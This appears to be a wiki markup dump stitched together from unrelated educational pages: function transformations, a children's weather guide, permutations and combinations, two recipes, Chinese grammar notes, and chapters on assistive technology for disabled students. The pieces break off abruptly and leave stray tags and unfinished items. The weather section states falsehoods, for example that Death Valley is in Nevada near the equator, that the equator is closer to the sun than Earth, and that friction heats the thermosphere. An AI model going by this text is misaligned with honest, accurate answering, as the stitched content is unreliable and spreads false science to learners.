      <text xml:space="preserve">A transformation of a given figure changes its size, position, or shape.  Lines of reflection, angle measurements, and distances are used to describe transformations according to the type of transformation that occurred.  Not only can you transform shapes and figures, but you can also transform functions.  Piecewise functions can be transformed through the application of transformations to each piece individually.  Different ways to transform functions are: horizontal and vertical translation, reflection across the x- and y-axis, and horizontal and vertical stretch/compression.

      <comment>/* The Sun */</comment>
      <text xml:space="preserve">What is weather? I'm sure your mum always complains about the weather! But weather is more than an excuse to moan. Weather affects our health, culture and evolution. I'm sure you've heard about thunderstorms, rain, sun etc., but how do they form? This page tells you all you must know about weather.

==Atmosphere==

The atmosphere is anything between 'the ground' and 'space'. The atmosphere is the driving force of the weather, and is vital for the well-being of all life on Earth. But why? 

===Layers===
The atmosphere is sectioned into different layers. Each layer does different things. 

====Troposphere====
The first layer. It extends to 6km, slightly higher than Everest. This layer holds the Oxygen we need to breathe and this is the place weather forms. Without weather, we would have no rain, how could we live without rain? 

====Stratosphere====
The second layer. Extends from 6-30 miles above us. The Stratosphere is important because The Ozone layer lies in this zone. The Ozone layer protects us from the harmful rays the sun produces.

====Mesosphere====
Not just the layer with a catchy name! This layer extends from 30-50 miles. It doesn't really have any specific importance, but without it, our atmosphere would be a lot thinner, meaning less protection from dangers in space. 

====Thermosphere====
This is the last layer of the atmosphere. It extends from 50-310 miles and is the first line of protection against hazards such as meteorites ('space rocks'). There is lots of friction here, which makes it hot enough to burn up most dangers. Temperatures in some areas may be 1000 °c, or even hotter! Past the Thermosphere is 'space'. 

==The engine behind weather==
What is the engine behind weather? There are three important engines: the sun, convection, and pressure. 

===The Sun===
The sun is the main reason why some places are hotter than each other. Death Valley, Nevada, experienced the hottest recorded temperature on Earth, at a scorching 57°c- that's nearly as hot as your hot tap. The world's coldest recorded temperature was at Vostock station, Antarctica, which recorded a temperature of -89- colder than your average day on Mars. Death Valley is near the equator, and Vostock is in Antarctica- so the sun must be a big contributor to heat. Earth, although tilted, has a sort of bulge, the equator being at the centre of this 'bulge'. The Arctic diameter is much less than the equator's. So in fact, the equator is closer to the sun than Earth. Another common factor that changes temperature is altitude (how high you are)

===Convection===
Warm air is much less dense (the particles are much more spread out) than cold air. In other words, warm air is lighter than cold air. Because warm air is light, it rises, and because cold air is heavy, it falls. The warm air rises to a certain height and becomes cold again (it gets colder the higher into the atmosphere you go); it may condense (turn into liquid) and become rain. Once the cold air warms up by being close to the surface, it starts rising, completing the cycle. Convection is a great engine of weather. 

===Air Pressure===
Air pressure greatly affects what kind of weather we experience. There are two types of air pressure: high pressure and low pressure. 

====Low Pressure====
This is the type of weather that usually means stormy weather. Warm air is much less dense than cold air, so it rises. As it rises, the air cools, condensing to form clouds. Water vapour condenses in the clouds to form rain. 

====High Pressure====
Although high pressure usually means calm, settled weather, high pressure is usually cooler than low pressure. Cold air is much denser than warm air, so it sinks. You end up with settled, but cool, weather- shame you can't get the best of both!

==Types of weather== 
There are many types of weather that we experience in our daily lives: you sunbathe when it is hot and sunny; and you put your coat on when it rains and becomes cold, we all have a pretty good general idea of weather- but you may not know how they form. We are going to look at the effect of features on local weather.

===Wind===
We all experience wind. Wind is basically the movement of air- but how are some winds different to others? 

====Sea Breezes====
The sea takes longer to heat up than land. This makes the air over the land warmer. The warmer land air rises over the sea, and the air above gets replaced by the cooler sea air, creating sea breezes. Land breezes are the reverse, and happen because the sea also takes longer to cool. 

====Valley and Mountain Winds====
The sun heats up the air over Valley Slopes, making the warm air rise, and have a lower pressure than the air at the same level over the valley, creating the breeze. Mountain winds are simply the reverse of Valley Winds. 

===Precipitation===
There are a number of types of precipitation. Although sometimes we moan about it, it's a very important part of life of about every life form. The types: 

====Rain====
This forms from layered clouds. Clouds, caused by condensation of air, hold small ice droplets, caused by condensed water vapour. When the ice droplets fall through the cloud to a layer above 0°c, the droplets melt into drizzle or rain. 

====Drizzle====
Simply rain, but with smaller water droplets. 

====Hail====
In thunderclouds, ice droplets falling may be caught in strong updrafts, they collide with many other ice droplets, growing larger and larger. Some hailstones may be bigger than golfballs and may damage cars. 

====Snow====
If it is really cold, the ice droplets may not melt as they fall through the clouds, so they land as snow. The temperature effects what the snow is like: the shape and hardness. 

====Sleet====
Sleet are small drops of snow like drizzle is small drops of rain. This is when rain falls through cold cloud (below 0°c), sleet is kind of between rain and snow.

====Frost====
Frost is the cold white sheets on grass, and gives a beautiful crispy texture. There are two types of frost: 

=====Hoar Frost=====
This is the most common type of frost and forms in two ways: 

1. Dew freezes on grass and other surfaces

2. Water vapour freezes before turning into Dew. 

=====Rime Frost=====
Less common. This is when liquid water below freezing point (0°c) in fog touch a surface below freezing point and finally freezes into ice. 

===Thunderstorms===
There is something about a Thunderstorm that fascinates; perhaps the boom of a thundercloud, or maybe the danger of a lightning strike. 

====Which comes first====
A good way of remembering the speed of light and sound is to remember the famous phrase: 'which came first: the thunder or the lightning?'

=====How far away...=====
Light travels at an astonishing 186,282 miles per second! So we see lightning almost as it happens. But sound travels much slower (but it's still very fast). To estimate how far away lightning is, count the number of seconds between seeing the lightning and hearing the thunder. Divide by 5 to discover the distance by miles (or by 3 for km). 

====How they are formed====
The stages of a thunderstorm. 

1. A Cumulus cloud grows. Updrafts develop, preventing precipitation from falling.

2. Downdrafts develop, precipitation forms. Wind, thunder, and lightning occur. 

3. Downdrafts cut off updrafts. Cloud begins to collapse. Precipitation stops. Other clouds may form over the shrinking cloud. 

===Fog===
Fog is formed when the air becomes saturated. Water vapour comes in contact with the ground, condensing to form fog. 

NOTE: Mist is light fog 

====Types of fog====
There are a number of types of fog. These include Advection fog. This is when warm ocean air is blown across a colder landmass, the vapour falls onto the land. (see convection) Dew is the moisture that can be seen on grass or other surfaces on those cold mornings. Like fog, it forms within contact with the ground, direct contact in this case. 

===Rainbows===
Rainbows are present when the sun is out and it is raining at the same time. The science of a rainbow is quite complicated: put simply, sunlight rebounds of the raindrops, extracting all the sunlight's colours, forming the famous bow. 

==Quiz== 
# What part of the map do the storm warnings seem to be centred?

      <comment>/* Permutation Examples */</comment>
      <text xml:space="preserve">== Factorials ==
A factorial, symbolized by ''n!'' with ''n'' being a number between 1 and infinite, is a product of consecutive counting numbers starting at 1 and ending at ''n''.  The number 0 is an exception.  0! has a value of 1.  Factorials are used in many ways, from their use in equations to solving word problems.  Their most useful application is through the calculation of the number of outcomes of an event.  For example, it can produce the possible outcomes of the race, and how many combinations of first, second, third, and so forth of the racers.

'''''n'' Factorial'''

For any whole number ''n'', it's factorial is the product of the natural numbers that are less than or equal to it.  For example:

7! = 7 x 6 x 5 x 4 x 3 x 2 x 1 = 5040

The algebra behind factorials looks like this:

''n''! = ''n'' x (''n-1'') x (''n-2'') x (''n-3'') x ... x 1

== Permutations ==
Permutations is all the possible outcomes of a given value.  For example, if you were given three colors (red [r], green [g], and yellow [y]) and were asked to find possible arrangements of them, you would find 6 possible arrangements: rgy, ryg, gyr, gry, yrg, ygr.

In a permutation, the order of the objects in the group is important.  Using the same example above, we are given three different colors (red [r], green [g], and yellow [y]).  If we were just given red [r], then there would be only one way to arrange it: red.  However, when green [g] is thrown in the mix, there are now two ways to arrange these two colors: '''rg''' or '''gr'''.  And now, when a third color is thrown in (yellow [y]), then there are now six possible outcomes, as stated above.  The amount of permutations of the 3 colors is equal to 3 x 2 x 1, which equals 6.  This is also equal to the factorial of 3:

3! = 3 x 2 x 1 = 6

The general formula for a permutation of ''n'' items is:

''n'' x (''n'' - 1) x (''n'' - 2) x (''n'' - 3) x ... x 1

As mentioned above, this is also called the ''n factorial'', and is written like this:

''n!''

But, what if you don't want to order the whole set of things?  Let's say that you need to select an order of 3 things from a group of 8.  The '''Fundamental Counting Principle''' is one way to do just that.

First Thing: '''8 possibilities'''

Second Thing: '''7 possibilities'''

Third Thing: '''6 possibilities'''

The number of permutations in this example is '''336'''.  In other words, there are 8 things, and we are choosing 3 of them in order.  The '''336''' comes from the 8 possibilities x 7 possibilities x 6 possibilities.

Factorials, as stated above, can also be used to find permutations.  The number of arrangements can be divided by the number of arrangements not used.  Using the example above, there are 8 things, 3 arrangements of which do not matter.  For large numbers of objects, it is useful to use this generalized formula:

&lt;sub&gt;n&lt;/sub&gt;P&lt;sub&gt;r&lt;/sub&gt; = ''n''! / ''(n-r)''!

This algebra, stated in words, reads like this: the number of permutations of ''n'' items taken ''r'' at a time is ___ .

So, in the example used above, 8 things taken 3 at a time would give us:

&lt;sub&gt;8&lt;/sub&gt;P&lt;sub&gt;3&lt;/sub&gt; = 8! / (8-3)! = 8! / 5! = 336

== Permutation Examples ==
'''1. How many ways could all the students in a high school vote for the homecoming king and queen from a group of 6 people? '''

In other words, this question is asking us to select and arrange 2 things from 6 things.  So, first thing to do isd to substitute 6 in for ''n'' in our &lt;sub&gt;n&lt;/sub&gt;P&lt;sub&gt;r&lt;/sub&gt; formula and 2 in for r:

&lt;sub&gt;6&lt;/sub&gt;P&lt;sub&gt;2&lt;/sub&gt; = 6! / (6-2)! = 6! / 4! = (6 x 5 x 4 x 3 x 2 x 1) / (4 x 3 x 2 x 1) = 6 x 5 = 30

So, there are 30 ways to vote for the homecoming king and queen.

'''2. You have 10 picture frames to hang on your bedroom wall; however, you only have enough space for 5 frames.  How many ways can you hang any 5 picture frames on your wall?'''

&lt;sub&gt;10&lt;/sub&gt;P&lt;sub&gt;5&lt;/sub&gt; = 10! / (10-5)! = 10! / 5! = (10 x 9 x 8 x 7 x 6 x 5 x 4 x 3 x 2 x 1) / (5 x 4 x 3 x 2 x 1) = 10 x 9 x 8 x 7 x 6 = 30,240

So, there are 30,240 ways that you can pick the pictures you want to hang on your wall.  

If you notice, in the above two examples, the number of things selected is equal to the number of factors left after dividing the two factorials.  For instance, in example 1, there were 2 people we were voting for and, thus, 2 factors that were left after dividing the factorials: 6 x 5.

== Combination ==
When items are grouped and the order in which they are grouped doesn't matter, this is known as a combination.  Normally, when order doesn't matter, there are less ways to choose things.  Let's say we have 4 different letters: A, B, C, and D.  There are 24 different ways to put these 4 letters in order (permutation).  However, they are all the same combination for letters.

'''24 permutations:''' ABCD, ACDB, ADBC, ACBD, ADCB, ABDC, BACD, BADC, BDCA, BDAC, BCAD, BCDA, CDAB, CDBA, CBAD, CBDA, CABD, CADB, DABC, DACB, DBCA, DBAC, DCAB, DCBA

'''1 combination:''' ABCD

The formula previously used for permutations can be changed and used to find the number of combinations:

'''(ways to arrange all of items) / (ways to arrange items not selected) = number of permutations'''

To change this formula to find the number of combinations, the number of permutations will be divided by the number of ways to arrange the items selected.  This is due to the fact that in combinations, order does not matter.  

'''(ways to arrange all of items) / ''(ways to arrange items selected)'' x (ways to arrange items not selected) = number of combinations'''

So, the algebraic formula for finding combinations of ''n'' items taken ''r'' at a time is:

&lt;sub&gt;n&lt;/sub&gt;C&lt;sub&gt;r&lt;/sub&gt; = ''n''! / ''r''! x (''n - r'')!

For example, the number of combinations of 8 items taken 4 at a time is:

&lt;sub&gt;8&lt;/sub&gt;C&lt;sub&gt;4&lt;/sub&gt; = 8! / 4!(8-4)! = 70

So, how do you know whether or not to use a permutation versus a combination.  The first thing you need to figure out is whether or not order matters.  If it does, then permutations are needed to solve the problem.  However, if order does not matter, then combination is the method to be used.  

== Combination Examples ==

'''1. Lauren wants to buy 4 puppies for her farm.  The puppy store has 12 puppies to choose from.  How many ways can she choose 4 puppies?
'''
The first thing to do is decide whether to use the formula for permutation of combination to solve the problem.  Since order is not an issue, the combination method is to be used.  

The combination method looks like this:

&lt;sub&gt;12&lt;/sub&gt;C&lt;sub&gt;4&lt;/sub&gt; = 12! / 4!(12-4)! = 12! / 4!(8!) 

= (12 x 11 x 10 x 9 x 8 x 7 x 6 x 5 x 4 x 3 x 2 x 1) / (4 x 3 x 2 x 1)(8 x 7 x 6 x 5 x 4 x 3 x 2 x 1)

= (12 x 11 x 10 x 9) / (4 x 3 x 2 x 1) = 495

So, there are 495 different ways to choose 4 puppies from a given 12 puppies.

This dish was made for adults. Instead of just cheddar, we put in Fontina, mascarpone, Gruyere, cream cheese, and Swiss.

== Ingredients ==
*½ pound (227 g) elbow [[Cookbook:Macaroni|macaroni]]
*6 ounces (170 g) heavy [[Cookbook:Cream|cream]]
*½ teaspoon (2.5 mL) kosher [[Cookbook:Salt|salt]], plus more for the water
*½ cup (120 mL) each grated Fontina, grated [[Cookbook:Gruyère Cheese|Gruyere]], [[Cookbook:Mascarpone Cheese|mascarpone]] cheese, and [[Cookbook:Cream Cheese|cream cheese]]
*4 thin slices [[Cookbook:Emmental Cheese|Swiss cheese]], julienned
*1 ¼ sticks unsalted [[Cookbook:Butter|butter]], divided
*2 tablespoons (30 mL) all-purpose [[Cookbook:Flour|flour]]
*1 teaspoon (5 mL) [[Cookbook:Tabasco Sauce|tabasco sauce]]

== Procedure ==
#In a gallon (~3.8 L) of salted boiling water, cook macaroni to al dente. Strain into a colander and rinse with cold water.
#While pasta is cooking, in a heavy saucepan, melt 2 tablespoons (15 mL) butter over medium heat. Once bubbling ceases, whisk in flour and cook, whisking continuously, until blonde.
#Add remaining ingredients except butter. Once cheese is melted and sauce is smooth, add 1 tablespoon butter, whisking continuously until melted. Repeat until all butter has been used.
#Gently fold in macaroni and serve warm.

== Preface ==
Assistive Technology can make the difference between a successful school experience and a failed one. As disabled students grow, they may be able to find technology that can help them a little bit, that can make up for their disability, or that can help them exceed what they or others ever expected. Assistive technology, or ''AT'', is a field that is changing as fast or faster than the rest of technology used in teaching and learning. This book will initially focus on assistive technology that can be used in a normal classroom.

*&quot;To Be&quot; Sentences are (A Noun)-是-(Another Noun)
*To say &quot;Something is _______&quot; you use 很 instead of 是
:老师很快乐。- A teacher is happy.
*Negative sentences are formed by placing 不 before the verb or adjective
**This is different for &quot;To Have&quot;
:我没有朋友。
:她不是猫。

Cracked pepper adds a nice texture difference between the creamy cheese, tender meat, and the toasted bun, and complements the chipotle mayo.

== Ingredients ==
* 1 pound ground chuck steak
* Salt
* 1/4 cup cracked black peppercorns, plus more if needed
* 4 slices of your favorite smooth-melting cheese, room temperature (optional)
* Dijon mustard
* 4 hamburger buns, halved
* Chipotle mayo, recipe below

== Procedure ==
#Shape beef into 4 equal patties. Brush with Dijon mustard on both sides and sprinkle liberally with kosher salt on both sides.
#Place peppercorns in a pie pan. Press patties lightly on both sides into pepper. Set aside.
#Heat about 25 charcoal briquets in a large chimney starter. Reapply grate.
#Add burgers and cook, turning often, until internal temperature reaches 143 degrees F for medium rare, 157 for medium, and 167 for well/toast.
#Remove to a plate and let rest for 5 minutes. If using cheese, place one slice on top of each patty. Meanwhile, toast buns on the grill.
#Spread buns with chipotle mayo. Add a patty on top of the bottom half of a bun and top with the other half. Serve warm.

'''Chipotle Mayo'''
# 1/2 cup mayonnaise
# 2-4 chipotle chiles, finely minced
# 1/2 teaspoon salt
# 1/2 teaspoon freshly ground black pepper

== Early Childhood ==

=== Emergent Literacy ===

Emergent literacy is defined as the early stages of development that begins at birth and continues until children learn to read and write conventionally.  It progresses through a variety of phases that includes oral language, early experiences with print, picture books and writing.  Young children learn literacy skills in a variety of ways as they play, handle books, observe adults using print materials, and interact with others during storybook reading. One of the keys to successful achievement of literacy is the active participation of children in literacy activities. Children need to be actively involved in handling books and interacting with family members and teachers during reading time. Although active involvement of children in literacy may seem natural, active participation may be a challenge for children with disabilities. Children who have physical and cognitive limitations may miss valuable opportunities to develop literacy in the same ways as  other children (Robinson, 2006).&lt;ref&gt;Robinson,L.(2006). ''Adapting Literacy Activities for Young Children.'' Retreieved July 14, 2009, from http://www.wiu.edu/thecenter/articles/adaptlit.html.&lt;/ref&gt; 

Children who are nonverbal or have physical disabilities may have limited opportunities to learn to read, may have little interaction with others during literacy activities, and may be given fewer opportunities to read and write than their peers without disabilities. Technology-based literacy activities can provide modifications and adaptations that support children who are nonverbal or who have physical disabilities to be successful in instructional process (Beck, 2002).&lt;ref&gt;Beck, J. (2002). Emerging literacy through assistive technology. ''Teaching Exceptional Children 35''(2), 44-48.&lt;/ref&gt;  [[Image:Child reading at Brookline Booksmith.jpg|left|thumb|300px]] 

Early communication development requires that children participate actively in their environment.  This becomes extremely challenging for children who have significant social, cognitive, motor, and sensory disabilities. They often cannot independently interact with people and objects in the environment due to hearing, vision, or motor difficulties, do not present the ability to become fully independent communicators, and are not provided with multiple opportunities to engage in communicative-rich environments with a variety of capable partners (Dell,Newton, Petroff, 2008).&lt;ref&gt;Dell, A., Newton, D.A., Petroff, J.G. (2008). ''Assistive Technology in the Classroom: Enhancing the School Experiences of Students with Disabilities.'' Upper Saddle River, New Jersey: Pearson Education, Inc.&lt;/ref&gt;  Many times, children with disabilities are viewed as illiterate and are not afforded the opportunity to exercise communication through reading and writing.  To counteract this, it is important to use simple technology to help these children communicate and participate in literacy activities. 

A rising number of studies have looked at the significance of assistive technology and its appropriate implementation for students with special needs. Using intervention strategies with both high-tech and low-tech devices have helped children with disabilities succeed with developmentally appropriate activities. There are many products available to assist students with learning and literacy development.  This portion of the book will focus on one of the assistive technology curriculums that are available that promotes literacy development at its earliest stages. The MEville to WEville: Early Literacy and Communication Development Curriculum created by AbleNet and Don Johnston is a product that offers students with multiple physical and cognitive disabilites the opprtunity to participate in literacy instruction. It is an example of a research-validated curriculum that supports early literacy research findings.

==MEville to WEville==


===MEVille to WEVille Curriculum===


The MEville to WEville curriculum is the first ever research-based literacy program that meaningfully and systematically integrates reading, writing, speaking, augmentative communicating, and listening for elementary students with disabilities in the moderate to severe range. Lesson activities are written based on the understanding of the early literacy learning as described in the reports and additional research readings, such as National Reading Panel &lt;ref&gt;National reading Panel. (1998). ''Report of the National Reading Panel: Teaching children to read.''Retrieved August 3, 2009, from http://www.nationalreading panel.org/Publications/publications.htm&lt;/ref&gt;, Preventing Reading Difficulties in Young Children&lt;ref&gt; Snow, C.E., Burns, M.S., (1998). ''Preventing reading difficulties in young children: Executive Summary.'' Retrieved August 3, 2009 from http://stills.nap.edu/html/prdyc/&lt;/ref&gt;, and Rand Reading Comprehension Reports&lt;ref&gt; Rand Corporation. (2004). ''Reading for understanding: Toward a program in reading comprehension.'' Retrieved August 3, 2009, from http://www.rand.org/multi/acheivementfor all/reading/readreport.html&lt;/ref&gt;.

MEville to WEville was specifically developed for students with disabilities who have difficulties learning to read and write through traditional instructional methods. The instructional approach used in MEville to WEville supports integrated literacy and communication learning through a series of different activities that offer the opportunity for students to learn skills through repetition with variety. Rather than repeating the same skill until it is learned to a predetermined level of mastery, students are taught to apply skills across contexts. The intended result is increased comprehension and the ability to apply the new skills when and where appropriate (Erikson, Clendon, Abraham, Roy, &amp; Carr, 2005).&lt;ref&gt;Erickson, K.A., Clendon, S., Abraham, L., Roy, V., &amp; Van de Carr, H.(2005). Toward positive literacy, outcomes for students with significant developmental disabilities. ''Assistive Technology Outcomes and Benefits, 2''(1), 45-55&lt;/ref&gt; 

Students with disabilities often have difficulties learning to read and write using traditional instructional methods.  The MEville to WEville curriculum provides step-by-step instructions that clearly illustrate how to integrate these important skills into a teacher’s instructional activities. In addition, the systematic approach and organizational structure of the units allows the educator to spend more time focused on students’ individual needs as the lessons are all planned out. 

Designed to build a classroom community that encourages a sense of belonging, each unit offers students a new and different perspective on themselves, their families, and their school. MEville to WEville teaches reading, writing, listening, and speaking while using augmentative communication for students with communication disorders within the structure of its well designed curriculum.

Each unit contains a teacher’s manual with 75 lessons and extension activities. An “Action Dictionary” that serves as a guide for differentiating instruction for a range of needs and specific recommendations for making adaptations for assistive technology users is included in each unit. A separate story book, along with a host of reproducible activities designed to make consistent implementation in a demanding environment a reality is also incorporated into the curriculum. The lessons in each unit are broken down into five categories: language development, reading and listening comprehension, writing, reading, and literacy experience. 


'''Lessons that are in the units involve:'''

''Learning New Words:'' Students identify new words and develop expressive  language skills through saying words, singing songs, and using words in high-interest activities
 
''Vocabulary Activities:'' Students practice using the vocabulary words in engaging activities designed with repetition and variety to promote the understanding of each word
 
''Word Wall Words:'' Students learn high frequency words needed in reading and writing through activities such as clap/chanting, writing, and word identification

''Literacy Lessons:'' Students engage in lessons using literature books and real life experiences to practice choice making, direction following, and giving a personal response 

''Writing Lessons:'' Students make decisions about individual and group writings and express themselves through book making and other structured writing projects


The MEville to WEville curriculum can be presented in instructional units as small as 30 minutes, or several lessons can be presented over the course of the day, increasing the student’s literacy experience to one that is comparable to those of non-disabled peers. The lessons and activities are designed to actively engage the student in the reading and writing experience, presenting hands-on participation that is differentiated for all levels of ability. In addition, many of the lessons offer the opportunity for parents to become involved as students share information about themselves and their families across the curriculum. 


This resource systematically targets literacy skills that research has shown are critical to literacy learning success while incorporating content area goals and objectives. All lessons support the following literacy skills and are filled with fun and engaging lessons relating to the ME, MY FAMILY, and MY SCHOOL themes.

===MEville to WEville with Start to Finish Literacy Starters Program===

Recently, AbleNet, and Don Johnston created The MEville to WEville with Literacy Starters Program.  This new product expands the original MEville to WEville curriculum with the addition of Start-to-Finish Literacy Starters book sets for each of the three units.  The new addition to the curriculum builds on the original program, adding further enrichment with the addition of three more instructional areas: word study, comprehension, and writing. There is an additional teacher’s manual which contains lessons to support the implementation of the Start-to-Finish Literacy Starters content. 


Each of the Start-to-Finish Literacy Starters sets contains three different content related books per unit. The books are distinguished as “Enrichment”  “Transitional” and “Conventional”. The enrichment book contains the most words and the richest language. They are written to teach students about language and to help them develop concepts of print. The transitional books are written to encourage beginning readers to focus on the illustrations and the print contained in a book. Transitional books have fewer words than enrichment books and support the student to use print and picture cues in order to learn to read independently after several repeated readings. The conventional books contain the simplest text and the fewest words, many of them high frequency words. The student is given assistance in order to eventually be able to read the books independently for the purpose of developing fluency and increasing understanding. The books have a soft cover and contain photographic illustrations depicting real people engaged in the stories. The content and text is appropriate for all students including those in middle school and beyond. A CD-ROM is included with each set of books that enables the stories to be displayed and read aloud on the computer in a format that is identical to the soft cover books. Being able to view and read the books on the computer ensures access for all students as the books are switch accessible as well. The stories can be read aloud by the computer or the read-aloud feature can be turned off so that the student can read them independently.

=== MEville to WEville Research ===



In 2004, Dr. Karen Erickson from the Centre for Literacy and Disability Studies at the University of North Carolina at Chapel Hill completed a research study to evaluate the effectiveness of the MEville to WEville program. Initial results indicated: children initiated more communication and interaction during the program, children developed stronger social relationships with their peers in special and general education, children became more socially responsive, and teachers were able to spend more time addressing communication and literacy. Dr. Karen Erickson called MEville to WEville “the first ever research-based literacy program that meaningfully and systematically integrates reading, writing, speaking, augmentative communicating and listening for elementary students with cognitive disabilities in the moderate to severe range” (Spectronics, 2009).&lt;ref&gt;http://www.spectronics.co.nz/catalogue/meville-to-weville-early-literacy-and-communication-supplemental-curriculum&lt;/ref&gt;
Research was conducted on three classroom teachers and their 23 students with significant developmental disabilities.  The study was conducted over 8 weeks as the MEville to WEville curriculum was implemented.  Although the results of this study wer positive, further research would need to be conducted in order to gain a full understading of the implications of implementing this curriculum into your reading program.

== iPod Applications ==


=== iPod as an Educational Tool ===

'''The first iPod''' was launched on October 23, 2001 by [http://www.apple.com Apple Inc.] as a portable media player. Since the release of the first iPod there have been eighteen different models manufactured in five different styles including: iPod Classic, iPod Mini, iPod Nano, iPod Shuffle, and iPod Touch (iPod History, 2009). &lt;ref name=&quot;iPod History&quot;&gt;The complete history of the iPod: 2001 to present. Accessed July 13, 2009 at http://www.ipodhistory.com/.&lt;/ref&gt; The iPod has become a popular technology device among students of all ages in recent years. Students primarily use the iPod for access to digital media such as music, videos, and photos. 


[[Image:IPod_renderings.svg|left|thumb|300px|Four Available iPod Devices]]

Since the release of the first iPod in 2001, the device has become a presence in the classroom as teachers discover its many educational uses. Recent applications have improved use of the iPod for educational purposes. “From kindergarten to college, in applications of all kinds, what was originally designed as a mere portable music player is on its way to becoming an essential educational tool,” (Blaisdell, 2006).&lt;ref name=&quot;Blaisdell&quot;&gt; Blaisdell, M. (2006). In iPod we trust. ''T.H.E. Journal, 33''(8), 30-36.&lt;/ref&gt;  Part of the attraction of the iPod as an educational device is the fact that the iPod contains easily accessible audio and visual content in an attractive and conveniently sized package. Recent iPod models have become progressively more versatile and the availability of educational content is growing exponentially.


Universities across the United States have also recognized the value of the iPod as an educational tool with college students when they began issuing free iPods to incoming freshmen (Read, 2005).&lt;ref name=&quot;Read&quot;&gt; Read, B. (2005). Seriously, iPods are educational. ''Chronicle of Higher Education, 51''(28), A30-A32.&lt;/ref&gt; Duke University was one of the first higher education institutions to distribute iPods to freshmen in 2004, (Dean, 2004).&lt;ref name=&quot;Dean&quot;&gt; Dean, K. (2004). Duke gives iPods to freshmen. Accessed July 13, 2009 at http://www.wired.com/entertainment/music/news/2004/07/64282.&lt;/ref&gt; 


Another important development for educational use was the implementation of [http://www.apple.com/support/itunes_u/ iTunes University]. iTunes University was launched on May 30, 2007 and has over 175,000 free educational audio and video files available (Apple, 2009).&lt;ref name=&quot;iTunes University&quot;&gt; Apple, 2009. Mobile learning. Accessed July 13, 2009 at http://en.wikibooks.org/w/index.php?title=Assistive_Technology_in_Education/iPod&amp;action=edit&amp;section=2.&lt;/ref&gt; iTunes University, which is accessible through the iTunes Store, includes items such as lectures, podcasts, lessons, videos, and audio books that can be downloaded at no cost. iTunes University is possibly the world’s greatest collection of free educational media available to students, teachers, and lifelong learners.

=== iPod Touch as an Assistive Technology Device ===


[[Image:Ipodtouchicon.svg|right|thumb|200px|iPod Touch]]


'''The iPod Touch''' was first released on September 5, 2007 (iPod History, 2009).&lt;ref name=&quot;iPod History&quot;/&gt; Apple improved this model a year later by adding external volume controls and built-in microphone support. The second generation iPod touch was launched on September 9, 2008 (iPod History, 2009).&lt;ref name=&quot;iPod History&quot;/&gt; A built-in speaker on the second generation Touch adds the option for the iPod to be used as a recording device. Downloading an application such as [http://www.griffintechnology.com/products/italk iTalk] by Griffin Technology (Griffin Technology iTalk, 2009).&lt;ref name=&quot;Griffin&quot;&gt; Griffin technology: iTalk - A recording app for your iPhone or 2nd gen iPod Touch. Accessed July 13, 2009 at http://www.griffintechnology.com/products/italk.&lt;/ref&gt; can turn an iPod Touch into a high quality recording device. 


The development of the iPod Touch with features such as wireless internet access (Wi-Fi), built-in microphone support, and downloadable applications have significantly increased the applicability for use in the classroom. Apple’s iTunes store offers a wide range of educational applications available for use on the iPod touch. Applications in various subject areas exist for students ranging in age from preschool through college. This newest addition to the iPod family contains many features that can potentially be used as an assistive technology device. The information presented here is not intended to describe all of the assistive technology uses of the iPod Touch. The information that follows is an overview of potential applications for students with a variety of disabilities. This information can be used by parents, teachers, and therapists to examine possible resources that may improve student success in the classroom.


==== Visual Impairments ====


The iPod Touch is a device that is being used more frequently by individuals with visual impairments due to the availability of new applications. Several of these tools are available to users of both Macintosh and PC computers, and they can be downloaded directly from the iTunes store. Applications are accessible by the user almost immediately after the download process has been completed. 


One of the applications that is most used by visually impaired users is the free audio book application, [http://www.lexcycle.com/ Stanza] (Lexcycle, 2009).&lt;ref name=&quot;Lexcycle&quot;&gt;Stanza: A revolution in reading. Accessed July 13, 2009 at http://www.lexcycle.com/.&lt;/ref&gt; Stanza allows individuals to customize the view, which provides visually impaired users with the opportunity to increase the readability of text. Background and text colors can be changed to make text easier to see. In addition, font size, line spacing, and hyphenation can be adjusted making this application a valuable tool for visually impaired students. According to Dell, Newton, and Petroff (2008)&lt;ref name=&quot;Dell&quot;&gt; Dell, A.G., Newton, D.A., &amp; Petroff, J.G. (2008). ''Assistive technology in the classroom: Enhancing the school experiences of students with disabilities''. Upper Saddle River, NJ: Pearson Merrill Prentice Hall.&lt;/ref&gt; anecdotal evidence suggests that if given a choice, teenagers would prefer to read a book on an iPod, rather than a ‘special’ device. This suggests that Stanza would be a valuable application for use by students who need an alternative to reading traditional books.


Another tool that makes the iPod Touch more accessible for visually impaired users is [http://www.griffintechnology.com/products/italk iTalk] by Griffin Technology (Griffin Technology iTalk, 2009).&lt;ref name=&quot;Griffin&quot;/&gt; This application works with the built-in microphone to allow students to record their own voice. Students can use this feature to record notes which can be listened to at a later time. This feature is a valuable tool for completing assignments in an alternate way.


Although the iPod Touch lacks Voice Over, an application that reads text from an iPhone for users, there is an application that can be purchased for the iPod Touch, called [http://www.whatsoniphone.com/reviews/read2me-review Read2Me]. This application gives users the ability to listen to e-text files read aloud, using text-to-speech technology. Read2Me (Fergus, 2009)&lt;ref name=&quot;Fergus&quot;&gt;Fergus, B. (2009). Let your iPhone read to you with Read2Me. ''The iPod Observer.'' Accessed July 13, 2009 at http://www.ipodobserver.com/ipo/article/let_your_iphone_read_to_you_with_read_2_me/.&lt;/ref&gt; was developed by Retinal Media, and is the first and only application that allows speech synthesis. Speech synthesis is the artificial production of human speech. This feature provides the user with a human sounding voice. Read2Me is an application that provides users with the ability to change .txt files into spoken text. This application can quickly access sites like the [http://www.gutenberg.org/wiki/Main_Page Gutenberg Project] (Project Gutenberg, 2009),&lt;ref name=&quot;Gutenberg&quot;&gt;Project Gutenberg. (2009). Main page - Gutenberg. Accessed July 13, 2009 at http://www.gutenberg.org/wiki/Main_Page.&lt;/ref&gt; which is a large collection of free electronic books, or eBooks.  Accessing Project Gutenberg with the iPod Touch enables users to download a variety of electronic books that are compatible with Read2Me.


==== Hearing Impairments ====


Students with hearing impairments can also benefit from using the iPod Touch in the classroom. One of the most beneficial applications is [http://reviews.cnet.com/8301-19512_7-10281062-233.html| SoundAMP] (Broida, 2009).&lt;ref name=&quot;Broida&quot;&gt; Broida, R. (2009). SoundAMP turns an iPhone into a hearing aid. Accessed July 13, 2009 at http://reviews.cnet.com/8301-19512_7-10281062-233.html.&lt;/ref&gt; This application turns an iPod Touch into a hearing aid for individuals who have some hearing capabilities. With the built-in microphone, SoundAMP captures audio input and allows the user to adjust volume and tone to improve any hearing experience. There is also a ‘repeat’ feature that replays the conversation over if needed.


